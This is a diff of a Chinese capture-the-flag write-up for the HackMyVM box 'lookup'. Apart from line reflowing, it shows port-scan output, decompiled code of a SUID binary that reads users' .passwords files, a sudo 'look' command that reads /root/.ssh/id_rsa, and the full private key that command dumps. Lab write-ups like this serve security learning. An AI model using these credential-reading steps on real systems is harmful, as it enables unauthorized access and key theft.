@@ -9,7 +9,8 @@ description: "  根据端口开放情况来看，只能根据web先来看，web�
 ##### [](#0x01端口扫描 "0x01端口扫描")0x01端口扫描
 
 ```shell
-PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 08:00:27:0A:44:CF (Oracle VirtualBox virtual NIC)22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-title: Did not follow redirect to http://lookup.hmv|_http-server-header: Apache/2.4.41 (Ubuntu)
+PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 08:00:27:0A:44:CF (Oracle VirtualBox virtual NIC)22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux;
+protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-title: Did not follow redirect to http://lookup.hmv|_http-server-header: Apache/2.4.41 (Ubuntu)
 ```
 
 ##### [](#0x02目录扫描 "0x02目录扫描")0x02目录扫描
@@ -73,7 +74,51 @@ ls -al /usr/sbin/pwm-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm
 x64位程序使用ida反编译，拿到伪代码，分析一下。
 
 ```c
-int __fastcall main(int argc, const char **argv, const char **envp){  char v4; // [rsp+Fh] [rbp-131h]  FILE *stream; // [rsp+10h] [rbp-130h]  FILE *v6; // [rsp+18h] [rbp-128h]  char v7[64]; // [rsp+20h] [rbp-120h] BYREF  char s[112]; // [rsp+60h] [rbp-E0h] BYREF  char filename[104]; // [rsp+D0h] [rbp-70h] BYREF  unsigned __int64 v10; // [rsp+138h] [rbp-8h]  v10 = __readfsqword(0x28u);  puts("[!] Running 'id' command to extract the username and user ID (UID)");  snprintf(s, 0x64uLL, "id");  stream = popen(s, "r");  if ( stream )  {    if ( (unsigned int)__isoc99_fscanf(stream, "uid=%*u(%[^)])", v7) == 1 )    {      printf("[!] ID: %s\n", v7);      pclose(stream);      snprintf(filename, 0x64uLL, "/home/%s/.passwords", v7);      v6 = fopen(filename, "r");      if ( v6 )      {        while ( 1 )        {          v4 = fgetc(v6);          if ( v4 == -1 )            break;          putchar(v4);        }        fclose(v6);        return 0;      }      else      {        printf("[-] File /home/%s/.passwords not found\n", v7);        return 0;      }    }    else    {      perror("[-] Error reading username from id command\n");      return 1;    }  }  else  {    perror("[-] Error executing id command\n");    return 1;  }}
+int __fastcall main(int argc, const char **argv, const char **envp){
+    char v4;
+    // [rsp+Fh] [rbp-131h]  FILE *stream;
+    // [rsp+10h] [rbp-130h]  FILE *v6;
+    // [rsp+18h] [rbp-128h]  char v7[64];
+    // [rsp+20h] [rbp-120h] BYREF  char s[112];
+    // [rsp+60h] [rbp-E0h] BYREF  char filename[104];
+    // [rsp+D0h] [rbp-70h] BYREF  unsigned __int64 v10;
+    // [rsp+138h] [rbp-8h]  v10 = __readfsqword(0x28u);
+    puts("[!] Running 'id' command to extract the username and user ID (UID)");
+    snprintf(s, 0x64uLL, "id");
+    stream = popen(s, "r");
+    if ( stream )
+    {
+        if ( (unsigned int)__isoc99_fscanf(stream, "uid=%*u(%[^)])", v7)
+        == 1 )    {
+            printf("[!] ID: %s\n", v7);
+            pclose(stream);
+            snprintf(filename, 0x64uLL, "/home/%s/.passwords", v7);
+            v6 = fopen(filename, "r");
+            if ( v6 )      {
+                while ( 1 )
+                {
+                    v4 = fgetc(v6);
+                    if ( v4 == -1 )
+                    break;
+                    putchar(v4);
+                }
+                fclose(v6);
+                return 0;
+            }
+            else      {
+                printf("[-] File /home/%s/.passwords not found\n", v7);
+                return 0;
+            }
+        }
+        else    {
+            perror("[-] Error reading username from id command\n");
+            return 1;
+        }
+    }
+    else  {
+        perror("[-] Error executing id command\n");
+        return 1;
+    }}
 ```
 
 1.  首先运行id命令将id命令结果写入数组，之后进行读取，如果能读到内容。就进行下一步
@@ -112,6 +157,7 @@ LFILE=/root/.ssh/id_rsasudo look '' "$LFILE"
 
 ```plaintext
 -----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAptm2+DipVfUMY+7g9Lcmf/h23TCH7qKRg4Penlti9RKW2XLSB5wRQcqy1zRFDKtRQGhfTq+YfVfboJBPCfKHdpQqM/zDb//ZlnlwCwKQ5XyTQU/vHfROfU0pnRj7eIpw50J7PGPNG7RAgbP5tJ2NcsFYAifmxMrJPVR/+ybAIVbB+ya/D5r9DYPmatUTLlHDbV55xi6YcfV7rjbOpjRj8hgubYgjL26BwszbaHKSkI+NcVNPmgquy5Xw8gh3XciFhNLqmdISF9fxn5i1vQDB318owoPPZB1rIuMPH3C0SIno42FiqFO/fb1/wPHGasBmLzZF6Fr8/EHC4wRj9tqsMZfD8xkk2FACtmAFH90ZHXg5D+pwujPDQAuULODP8Koj4vaMKu2CgH3+8I3xRMhufqHa1+Qe3Hu++7qISEWFHgzpRMFtjPFJEGRzzh2x8F+wozctvn3tcHRv321W5WJGgzhdk5ECnuu8Jzpg25PEPKrvYf+lMUQebQSncpcrffr9AAAFiJB/j92Qf4/dAAAAB3NzaC1yc2EAAAGBAKbZtvg4qVX1DGPu4PS3Jn/4dt0wh+6ikYOD3p5bYvUSltly0gecEUHKstc0RQyrUUBoX06vmH1X26CQTwnyh3aUKjP8w2//2ZZ5cAsCkOV8k0FP7x30Tn1NKZ0Y+3iKcOdCezxjzRu0QIGz+bSdjXLBWAIn5sTKyT1Uf/smwCFWwfsmvw+a/Q2D5mrVEy5Rw21eecYumHH1e642zqY0Y/IYLm2IIy9ugcLM22hykpCPjXFTT5oKrsuV8PIId13IhYTS6pnSEhfX8Z+Ytb0Awd9fKMKDz2QdayLjDx9wtEiJ6ONhYqhTv329f8DxxmrAZi82Reha/PxBwuMEY/barDGXw/MZJNhQArZgBR/dGR14OQ/qcLozw0ALlCzgz/CqI+L2jCrtgoB9/vCN8UTIbn6h2tfkHtx7vvu6iEhFhR4M6UTBbYzxSRBkc84dsfBfsKM3Lb597XB0b99tVuViRoM4XZORAp7rvCc6YNuTxDyq72H/pTFEHm0Ep3KXK336/QAAAAMBAAEAAAGBAJ4t2wO6G/eMyIFZL1Vw6QP7VxzdbJE0+AUZmIzCkK9MP0zJSQrDz6xy8VeKi0e2huIr0Oc1G7kA+QtgpD4G+pvVXalJoTLl+K9qU2lstleJ4cTSdhwMx/iMlb4EuCsP/HeSFGktKH9yRJFyQXIUx8uaNshcca/xnBUTrf05QH6a1G44znuJ8QvGF0UC2htYkpB2N7ZF6GppUybXeNQi6PnUKPfYT5shBc3bDssXi5GXNn3QgK/GHu6NKQ8cLaXwefRUD6NBOERQtwTwQtQN+n/xIs77kmvCyYOxzyzgWoS2zkhXUzYZyzk8d2PahjPmWcGW3j3AU3A3ncHd7ga8K9zdyoyp6nCF+VF96DpZSpS2Oca3T8yltaR11fkofhBy75ijNQTXUHhAwuDaN5/zGfO+HS6iQ1YWYiXVZzPsktV4kFpKkUMklC9VjlFjPit1zMCGVDXu2qgfoxwsxRwknKUt75osVPN9HNAU3LVqviencqvNkyPX9WXpb+z7GUf7FQAAAMEAytl5PGb1fSnUYB2Q+GKyEk/SGmRdzV07LiF9FgHMCsEJEenk6rArffc2FaltHYQ/Hzw/GnQakUjYQTNnUIUqcxC59SvbfAKf6nbpYHzjmWxXnOvkoJ7cYZ/sYo5y2Ynt2QcjeFxnvD9I8ACJBVQ8LYUffvuQUHYTTkQO1TnptZeWX7IQml0SgvucgXdLekMNu6aqIh71AoZYCjrirB3Y5jjhhzwgIK7GNQ7oUe9GsErmZjD4c4KueznC5r+tQXu3AAAAwQDWGTkRzOeKRxE/C6vFoWfAj3PbqlUmS6clPOYg3Mi3PTf3HyooQiSC2T7pK82NBDUQjicTSsZcvVK38vKm06K6fle+0TgQyUjQWJjJCdHwhqph//UKYoycotdP+nBin4x988i1W3lPXzP3vNdFEn5nXd105qIRkVl1JvJEvrjOd+0N2yYpQOE3Qura055oA59h7u+PnptyCh5Y8g7O+yfLdw3TzZlR5TDJC9mqI25np/PtAKNBEuDGDGmOnzdU47sAAADBAMeBRAhIS+rM/ZuxZL54t/YL3UwEuQissJP2G3w1YK7270zGWmm1LlbavbIX4k0u/V1VIjZnWWimncpl+Lhj8qeqwdoAsCv1IHjfVFdhIPjNOOghtbrg0vvARsMSX5FEgJxlo/FTw54p7OmkKMDJREctLQTJC0jRRRXhEpxw51cL3qXILoUzSmRum2r6eTHXVZbbX2NCBj7uH2PUgpzso9m7qdf7nb7BKkR585f4pUuI01pUD0DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==-----END OPENSSH PRIVATE KEY-----
+
 ```
 
 将内容保存在rsa文件中
